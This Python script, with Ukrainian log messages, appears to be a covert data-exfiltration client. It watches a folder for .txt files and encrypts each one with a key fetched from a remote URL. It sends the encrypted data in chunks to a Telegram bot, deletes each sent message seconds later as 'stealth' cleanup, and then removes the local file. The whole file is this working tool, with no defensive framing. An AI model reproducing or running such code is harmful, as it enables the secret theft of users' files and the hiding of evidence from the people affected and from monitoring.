import os
import asyncio
import base64
import requests
from dotenv import load_dotenv, find_dotenv
from telethon import TelegramClient, errors, events
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.fernet import Fernet

load_dotenv(find_dotenv())

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_USERNAME = os.getenv("BOT_USERNAME")
TARGET_FOLDER = os.getenv("TARGET_FOLDER")
PUBLIC_KEY_URL = os.getenv("PUBLIC_KEY_URL")

def get_public_key():
    response = requests.get(PUBLIC_KEY_URL)
    return serialization.load_pem_public_key(response.content)

def hybrid_encrypt_data(data, public_key):
    aes_key = Fernet.generate_key()
    cipher_aes = Fernet(aes_key)
    encrypted_data = cipher_aes.encrypt(data)
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_aes_key + encrypted_data

async def setup_ping_listener(client):
    @client.on(events.NewMessage(chats=BOT_USERNAME))
    async def ping_handler(event):
        if "я сервер. все отримав" in event.text:
            print(f"\n[SERVER PING] ===> {event.text} <===\n")

async def main_loop(client, public_key):
    print("[+] Клієнт запущено. Режим передачі великих файлів (Chunking) зі стелс-видаленням.")
    
    while True:
        if not os.path.exists(TARGET_FOLDER):
            os.makedirs(TARGET_FOLDER)
            
        for filename in os.listdir(TARGET_FOLDER):
            if filename.endswith(".txt"):
                filepath = os.path.join(TARGET_FOLDER, filename)
                print(f"[*] Початок обробки файлу: {filename}")
                
                with open(filepath, "rb") as f:
                    data = f.read()
                
                encrypted_binary = hybrid_encrypt_data(data, public_key)
                b64_text = base64.b64encode(encrypted_binary).decode('utf-8')
                
                CHUNK_SIZE = 3000 
                parts = [b64_text[i:i + CHUNK_SIZE] for i in range(0, len(b64_text), CHUNK_SIZE)]
                total_parts = len(parts)
                file_id = os.urandom(4).hex()

                print(f"[*] Файл розбито на {total_parts} частин. Починаю відправку...")

                for idx, chunk in enumerate(parts):
                    stealth_msg = f"DATA_CHUNK|{file_id}|{idx}|{total_parts}|{chunk}"
                    success = False
                    
                    while not success:
                        try:
                            sent_msg = await client.send_message(BOT_USERNAME, stealth_msg)
                            print(f"[>] Відправлено частину {idx+1}/{total_parts}. Чекаю 1.5с і видаляю...")
                            
                            await asyncio.sleep(1.5)
                            await sent_msg.delete() 
                            
                            await asyncio.sleep(2.0)
                            
                            success = True 
                            
                        except errors.FloodWaitError as e:
                            print(f"[!] Антиспам Telegram! Змушені чекати {e.seconds} секунд...")
                            await asyncio.sleep(e.seconds + 2) 
                            
                        except Exception as e:
                            print(f"[-] Непередбачена помилка на частині {idx}: {e}. Повторна спроба через 5 сек...")
                            await asyncio.sleep(5)

                os.remove(filepath)
                print(f"[+] Файл {filename} повністю передано та видалено локально.")
        
        await asyncio.sleep(5)

async def start_client():
    client = TelegramClient('user_session', API_ID, API_HASH)
    await client.start()
    try:
        public_key = get_public_key()
        await setup_ping_listener(client)
        
        await main_loop(client, public_key)
    except Exception as e:
        print(f"[-] Критична помилка: {e}")

if __name__ == "__main__":
    asyncio.run(start_client())